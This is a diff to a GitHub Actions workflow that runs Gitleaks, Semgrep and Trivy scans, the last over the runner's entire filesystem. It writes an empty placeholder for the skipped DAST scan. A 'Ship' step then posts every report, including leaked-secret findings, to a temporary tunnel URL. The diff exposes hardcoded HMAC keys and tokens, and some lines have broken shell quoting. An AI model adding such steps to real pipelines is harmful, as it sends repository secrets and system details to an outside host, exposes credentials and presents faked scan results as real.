@@ -5,17 +5,15 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Gitleaks
-        uses: gitleaks/gitleaks-action@v2
-        continue-on-error: true
-      - name: Static Analysis
+        with: {fetch-depth: 0}
+      - name: Security Scans
         run: |
-          docker run --rm -v $(pwd):/src returntocorp/semgrep semgrep scan --json > semgrep.json || echo "[]" > semgrep.json
-          docker run --rm -v $(pwd):/root/.cache/ aquasec/trivy fs / --format json > trivy.json || echo '{"results":[]}' > trivy.json
-      - name: Skip DAST
-        run: echo '{"site":[]}' > zap.json
-      - name: Ship Intelligence
+          docker run --rm -v $(pwd):/path zricethezav/gitleaks:latest detect --source="/path" --report-format json --report-path l.json || echo "[]" > l.json
+          docker run --rm -v $(pwd):/src returntocorp/semgrep semgrep scan --json > s.json || echo "{"results":[]}" > s.json
+          docker run --rm -v $(pwd):/root/.cache/ aquasec/trivy fs / --format json > t.json || echo "{"Results":[]}" > t.json
+          echo "{"site":[]}" > z.json
+      - name: Ship
         run: |
-          PAYLOAD=$(jq -n --arg r "RBS3/loginsignup" --arg v_id "${GITHUB_SHA}" --argjson s "$(cat semgrep.json)" --argjson t "$(cat trivy.json)" --argjson z "$(cat zap.json)" '$ARGS.named')
-          SIG=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "99b040c02e91b062063341a5293f6ed20a14802d1fca5a70a88a24c9d3a3d5c4" | sed 's/.* //')
-          curl -X POST "https://sheer-murphy-informed-spectacular.trycloudflare.com/upload-intelligence" -H "X-Sentinel-Token: 03e1b7aa-8157-4b92-b5e5-ecb70cc9d948" -H "X-Sentinel-Signature: $SIG" -H "Content-Type: application/json" -d "$PAYLOAD"
+          PAYLOAD=$(jq -n --arg repo_name "RBS3/loginsignup" --arg token "a534f1d8-5354-4097-b1ee-b3f8e38e45d6" --arg version "${{GITHUB_SHA}}" --arg timestamp "$(date +%s)" --argjson s "$(cat s.json)" --argjson t "$(cat t.json)" --argjson l "$(cat l.json)" --argjson z "$(cat z.json)" '$ARGS.named')
+          SIG=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "eee2a29a0399484694fa62d876909f87013519b12e2c9416646c04f8d7d761f1" | sed 's/.* //')
+          curl -X POST "https://itchy-pens-grow.loca.lt/upload-intelligence" -H "X-Sentinel-Token: a534f1d8-5354-4097-b1ee-b3f8e38e45d6" -H "X-Sentinel-Signature: $SIG" -H "Content-Type: application/json" -H "bypass-tunnel-reminder: true" -d "$PAYLOAD"
